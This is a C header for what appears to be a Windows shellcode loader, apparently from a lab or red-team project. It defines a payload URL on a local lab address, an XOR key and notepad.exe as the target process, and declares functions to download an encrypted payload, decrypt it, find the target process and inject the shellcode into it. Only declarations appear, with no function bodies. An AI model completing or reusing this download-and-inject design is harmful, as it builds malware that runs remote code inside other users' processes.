#pragma once
#define METERWEB_H
#ifdef METERWEB_H

#include <stdio.h>
#include <Windows.h>
#include <Ip2string.h>
#include <wininet.h>
#include <TlHelp32.h>

#pragma comment(lib, "wininet.lib")

#define PAYLOAD_URL L"http://192.168.56.101:8000/payload.exe"
#define XOR_KEY 0x34
#define TARGETED_NAME L"notepad.exe"

void test();

BOOL DecryptXOR(PBYTE pShellcode, SIZE_T sShellSize, PBYTE* pResultShellcode);
BOOL GetPayloadFromUrl(LPWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize);
BOOL GetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwPID, HANDLE* hProcess);
BOOL RemoteProcInj(PBYTE bShellcode, SIZE_T sShellcodeSize, DWORD dwPID);

#endif